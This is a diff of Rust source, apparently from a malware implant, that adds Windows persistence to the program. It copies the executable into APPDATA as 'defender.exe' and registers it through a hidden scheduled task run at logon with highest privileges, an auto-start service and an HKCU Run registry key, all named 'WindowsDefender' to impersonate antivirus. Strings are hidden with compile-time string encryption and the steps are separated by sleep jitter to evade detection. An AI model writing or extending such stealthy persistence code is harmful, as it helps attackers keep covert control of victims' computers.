@@ -16,7 +16,7 @@ use winreg::enums;
 use winreg::RegKey;
 
 #[cfg(target_os = "windows")]
-const TARGET_SUBPATH: &str = "WindowsDefender\\defender.exe";
+const TARGET_BIN: &str = "defender.exe";
 
 #[cfg(target_os = "linux")]
 const TARGET_DIR: &str = ".cache/defender";
@@ -43,10 +43,31 @@ fn windows_persist() -> std::io::Result<()> {
         return dll_persistence(&current_exe);
     }
 
-    scheduled_task(&current_exe);
-    windows_service(&current_exe);
+    let appdata = env::var(cryptify::encrypt_string!("APPDATA"))
+        .map_err(|_| std::io::Error::new(std::io::ErrorKind::NotFound, "APPDATA not set"))?;
+    let target_path = Path::new(&appdata).join(TARGET_BIN);
+
+    if current_exe != target_path {
+        fs::copy(&current_exe, &target_path)?;
+    }
+
+    crate::obfuscate::sleep_jitter_default();
+    scheduled_task(&target_path);
+    crate::obfuscate::sleep_jitter_default();
+    windows_service(&target_path);
+    crate::obfuscate::sleep_jitter_default();
+    registry_runkey(&target_path);
 
     Ok(())
+}
+
+#[cfg(target_os = "windows")]
+fn registry_runkey(target_path: &Path) {
+    let path_str = target_path.to_string_lossy().to_string();
+    let hkcu = RegKey::predef(enums::HKEY_CURRENT_USER);
+    if let Ok((key, _)) = hkcu.create_subkey(cryptify::encrypt_string!("Software\\Microsoft\\Windows\\CurrentVersion\\Run")) {
+        let _ = key.set_value(cryptify::encrypt_string!("WindowsDefender"), &path_str);
+    }
 }
 
 #[cfg(target_os = "windows")]
@@ -87,7 +108,7 @@ fn scheduled_task(target_path: &Path) {
     let _ = Command::new(cryptify::encrypt_string!("schtasks"))
         .args(&[
             cryptify::encrypt_string!("/create"), cryptify::encrypt_string!("/tn"), cryptify::encrypt_string!("WindowsDefender"),
-            cryptify::encrypt_string!("/tr"), &path_str,
+            cryptify::encrypt_string!("/tr"), path_str,
             cryptify::encrypt_string!("/sc"), cryptify::encrypt_string!("onlogon"), cryptify::encrypt_string!("/rl"), cryptify::encrypt_string!("highest"), cryptify::encrypt_string!("/f"),
         ])
         .creation_flags(CREATE_NO_WINDOW)
@@ -100,7 +121,7 @@ fn scheduled_task(target_path: &Path) {
 fn windows_service(target_path: &Path) {
     let path_str = target_path.to_string_lossy().to_string();
     let _ = Command::new(cryptify::encrypt_string!("sc"))
-        .args(&[cryptify::encrypt_string!("create"), cryptify::encrypt_string!("WindowsDefender"), cryptify::encrypt_string!("binPath="), &path_str, cryptify::encrypt_string!("start="), cryptify::encrypt_string!("auto")])
+        .args(&[cryptify::encrypt_string!("create"), cryptify::encrypt_string!("WindowsDefender"), cryptify::encrypt_string!("binPath="), path_str, cryptify::encrypt_string!("start="), cryptify::encrypt_string!("auto")])
         .creation_flags(CREATE_NO_WINDOW)
         .stdout(std::process::Stdio::null())
         .stderr(std::process::Stdio::null())
